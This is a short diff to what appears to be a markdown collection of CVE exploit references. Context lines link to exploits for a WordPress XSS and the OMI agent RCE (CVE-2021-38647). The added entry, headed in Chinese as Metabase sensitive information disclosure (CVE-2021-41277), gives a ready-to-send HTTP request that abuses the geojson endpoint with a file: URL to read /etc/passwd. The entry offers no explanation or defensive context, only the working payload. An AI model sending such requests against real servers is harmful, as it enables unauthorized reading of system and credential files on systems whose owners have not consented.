@@ -43,6 +43,12 @@ https://medium.com/pentesternepal/cve-2021-24563-unauthenticated-stored-xss-fron
 ## CVE-2021-38647 is an unauthenticated RCE vulnerability effecting the OMI agent as root.
 https://github.com/horizon3ai/CVE-2021-38647
 
+## Metabase 敏感信息泄露 CVE-2021-41277
+```
+GET /api/geojson?url=file:/etc/passwd HTTP/1.1
+Host:
+```
+
 
 
 
